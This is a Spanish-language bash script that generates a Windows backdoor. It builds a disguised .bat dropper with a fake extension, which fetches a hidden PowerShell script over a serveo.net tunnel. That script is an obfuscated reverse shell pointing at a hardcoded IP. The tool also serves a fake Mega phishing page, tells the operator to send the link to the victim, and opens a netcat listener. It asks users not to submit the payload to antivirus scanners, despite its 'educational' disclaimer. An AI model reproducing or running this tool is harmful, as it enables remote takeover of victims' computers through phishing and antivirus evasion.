#!/bin/bash


# inicio
RESTORE=$(printf '\033[0m')
RED=$(printf '\033[00;31m')
GREEN=$(printf '\033[00;32m')
YELLOW=$(printf  '\033[00;33m')
BLUE=$(  printf '\033[00;34m')
MAGENTA=$( printf  '\033[00;35m')
PURPLE=$(  printf '\033[00;35m')
CYAN=$(  printf '\033[00;36m')
LIGHTGRAY=$(   printf '\033[00;37m')
LRED=$( printf  '\033[01;31m')
LGREEN=$(  printf '\033[01;32m')
LYELLOW=$( printf  '\033[01;33m')
LBLUE=$(  printf '\033[01;34m')
LMAGENTA=$(  printf '\033[01;35m')
LPURPLE=$( printf  '\033[01;35m')
LCYAN=$(  printf '\033[01;36m')
WHITE=$(  printf '\033[01;37m')


ASWhelp () {

echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
$RED
Nota:      Como desarrollador de la herramienta no me hago
           responsable , tampoco la comunidad se hace
           responsable del mal uso de la misma.
                             [NICK404]
                             $RESTORE
$CYAN

$RESTORE
$YELLOW

ayuda :    Si necesitas  ayuda por favor avisa en la comunidad
           twitter Oficial : https://twitter.com/error4o4org

$RESTORE
"



}

function sh_evasion3 () {
## WARNING ABOUT SCANNING SAMPLES (VirusTotal)

OS=`uname` # grab OS
user=`who | awk {'print $1'}`
distribution=`awk '{print $1}' /etc/issue`
path=`pwd` 
IP="159.89.214.31"

#loport=$(seq 1111 4444 | sort -R | head -n1)
netcat_escu=$(seq 1111 4444 | sort -R | head -n1)
port_tcp=$(seq 1111 4444 | sort -R | head -n1)


echo "$CYAN


'########:'##:::'##:'########:::'#######::'##::: ##:'########:'##::::::::::'#####:::'##::::::::
... ##..::. ##:'##:: ##.... ##:'##.... ##: ###:: ##: ##.....:: ##:::'##:::'##.. ##:: ##:::'##::
::: ##:::::. ####::: ##:::: ##: ##:::: ##: ####: ##: ##::::::: ##::: ##::'##:::: ##: ##::: ##::
::: ##::::::. ##:::: ########:: ##:::: ##: ## ## ##: ######::: ##::: ##:: ##:::: ##: ##::: ##::
::: ##::::::: ##:::: ##.. ##::: ##:::: ##: ##. ####: ##...:::: #########: ##:::: ##: #########:
::: ##::::::: ##:::: ##::. ##:: ##:::: ##: ##:. ###: ##:::::::...... ##::. ##:: ##::...... ##::
::: ##::::::: ##:::: ##:::. ##:. #######:: ##::. ##: ########::::::: ##:::. #####::::::::: ##::
:::..::::::::..:::::..:::::..:::.......:::..::::..::........::::::::..:::::.....::::::::::..:::



$RED     $OS|$user$YELLOW|2019.3|$distribution

	         $BLUE Autor:$YELLOW  NICK404 ADMINISTRATOR COMUNITY
		 $BLUE twitter:$YELLOW https://twitter.com/error4o4org




 		 $BLUE Version:$YELLOW 1.0
";
echo "   $RED
              POR FAVOR NO SUBIR EL BACKDOOR A  NINGUN SOFTWARE LECTOR DE VIRUS"

echo "
                   ++++++++++++++++++++++++++++++++++++++++++++++++++++
                   +        El uso inadecuado de las herramientas     +
                   +  no es responsabilidad de la comunidad , las     +
                   +  mismas son desarrolladas de manera , educativa. +
                   +                                                  +
                   ++++++++++++++++++++++++++++++++++++++++++++++++++++
              	 "
echo "[=============================================================================]"
sleep 2
        #Netcat
	which nc > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then
	echo "$CYAN[✔] Iniciando Servicio  Netcat [$GREEN OK $CYAN]$RESTORE"
            which nc > /dev/null 2>&1
        else
            echo "$CYAN[✔] Netcat no esta instalado [$RED :/ $CYAN]$RESTORE"
        fi
        sleep 1
	#php
	which php > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then
	echo "$CYAN[✔] Iniciando Servicio  PHP [$GREEN OK $CYAN]$RESTORE"
            which php > /dev/null 2>&1
        else
            echo "$CYAN[✔] PHP no esta instalado [$RED :/ $CYAN]$RESTORE"
        fi
        sleep 1
	#openssh
	#which openssh > /dev/null 2>&1
        #if [ "$?" -eq "0" ]; then
	#echo "$CYAN[✔] Iniciando Servicio  OpenSSH [$GREEN OK $CYAN]$RESTORE"
        #    which openssh > /dev/null 2>&1
        #else
        #    echo "$CYAN[✔] OpenSSH no esta instalado [$RED :/ $CYAN]$RESTORE"
        #fi
        #verificar conceion a intenet 
        ping -c 1 google.com > /dev/null 2>&1
        if [[ "$?" -eq "0" ]]; then
        echo "$CYAN[✔] Verificando conecion Internet [$GREEN OK $CYAN]$RESTORE"
        else
            echo "$CYAN[✔] Conexion a Internet [$RED :/ $CYAN]$RESTORE"
        fi
        sleep 1
        
        echo "        $RED[+]  Seleccione la opcion para iniciar:$RESTORE"
        echo "$YELLOW
                           [G] Generar BACKDOOR $GREEN[FUD]$YELLOW
                           [H] Ayuda
                           [E] Salir $RESTORE

"


	read -p "       $YELLOW [+] Seleccione la opccion de preferencia :" choice
	clear;
        echo "


 ########:'##:::'##:'########:::'#######::'##::: ##:'########:'##::::::::::'#####:::'##::::::::
... ##..::. ##:'##:: ##.... ##:'##.... ##: ###:: ##: ##.....:: ##:::'##:::'##.. ##:: ##:::'##::
::: ##:::::. ####::: ##:::: ##: ##:::: ##: ####: ##: ##::::::: ##::: ##::'##:::: ##: ##::: ##::
::: ##::::::. ##:::: ########:: ##:::: ##: ## ## ##: ######::: ##::: ##:: ##:::: ##: ##::: ##::
::: ##::::::: ##:::: ##.. ##::: ##:::: ##: ##. ####: ##...:::: #########: ##:::: ##: #########:
::: ##::::::: ##:::: ##::. ##:: ##:::: ##: ##:. ###: ##:::::::...... ##::. ##:: ##::...... ##::
::: ##::::::: ##:::: ##:::. ##:. #######:: ##::. ##: ########::::::: ##:::. #####::::::::: ##::
:::..::::::::..:::::..:::::..:::.......:::..::::..::........::::::::..:::::.....::::::::::..:::




	 		$BLUE Version:$YELLOW 1.0
"
	

read -p "[!] Ingrese el nombre del PAYLOAD [Default: Windows-Update]: " Drop

read -p "[!] Ingrese el nombre del Drop [Default: Update]: " NAMEP

read -p "[!] Ingrese el puerto del servidor [Ejemplo: Default 8000]: " lport

echo "[+] Construyendo el Shellcode..."
sleep 2

echo "[+] Configurando el servidor "

#Configurando Serveo
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $port_tcp:localhost:$netcat_escu serveo.net 2> /dev/null &
sleep 4

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$lport' serveo.net 2> /dev/null > link ' &
sleep 4
env_link=$(grep -o "https://[0-9a-z]*\.serveo.net" link)

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="8000";fi
if [ -z "$Drop" ]; then Drop="Windows-Update";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$NAMEP" ]; then NAMEP="Update";fi


## Random chose one fake extension for Masquerade dropper real extension 
conv=$(cat /dev/urandom | tr -dc '1-2' | fold -w 1 | head -n 1)
## if $conv number output 'its small than' number 3 ...
if [ "$conv" ">" "1" ]; then ext="crdownload"; else ext="cfg"; fi


## BUILD DROPPER
# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)

echo "@echo off" > $path/server/$Drop.$ext.bat
echo "echo Please Wait, Installing $NAMEP .." >> $path/server/$Drop.$ext.bat
echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('$env_link/$NAMEP.ps1', '$rpath\\$NAMEP.ps1')" >> $path/server/$Drop.$ext.bat
echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NAMEP.ps1\"" >> $path/server/$Drop.$ext.bat


## Convert attacker ip address to hex
one=$(echo $lhost|cut -d '.' -f1)
two=$(echo $lhost|cut -d '.' -f2)
tre=$(echo $lhost|cut -d '.' -f3)
four=$(echo $lhost|cut -d '.' -f4)
Hex=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
um=$(echo $Hex|cut -d ',' -f1)
dois=$(echo $Hex|cut -d ',' -f2)
tres=$(echo $Hex|cut -d ',' -f3)
quato=$(echo $Hex|cut -d ',' -f4)
strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
sleep 1

## Build Reverse Powershell Shell (obfuscated)
sleep 1
echo "<#" > $path/server/$NAMEP.ps1
echo "Obfuscacion (hex) Reverse Powershell Shell" >> $path/server/$NAMEP.ps1
echo "Original shell de  Paranoid Ninja" >> $path/server/$NAMEP.ps1
echo "#>" >> $path/server/$NAMEP.ps1
echo "" >> $path/server/$NAMEP.ps1
echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$port_tcp);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $path/server/$NAMEP.ps1
sleep 1
cd $path/server
zip $Drop.zip $Drop.$ext.bat > /dev/nul 2>&1
echo "$YELLOW[+] Empaquetando del Archivo "
cd $path/.phishing
sed "s|NaM3|$env_link/$Drop.zip|g" mega.html > copy.html
cp copy.html $path/server/index.html > /dev/null 2>&1
rm -rf copy.html
cd $path/server
php -S localhost:$lport > /dev/null 2>&1 &
sleep 2
echo "[+] Envia este link a la victima $RED $env_link $YELLOW"
read -p "[+] Presion Enter para continuar: " hol

}

trap ctrl_c INT
ctrl_c() {
   clear
   
   if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
   fi
   if [[ $checkssh == *'ssh'* ]]; then
        killall ssh > /dev/null 2>&1
   fi
   
   rm -rf $path/server/*
   rm -rf $path/link
   exit 1
}

ASWhelp
clear 
clear
sh_evasion3
cd $path/server
echo "[+] Se creara una sesion de Netcat a la Espera de la victima "
read -p "[+] Desea continuar con la conexion con netcat: " serv
echo "[+] Comenzado servidor."
echo "[+] Presione [ctrl+c] para salir"
xterm -T "Netcat Service" -geometry 70x30 -e "nc -lvp $netcat_escu" 
sleep 2  
ctrl_c






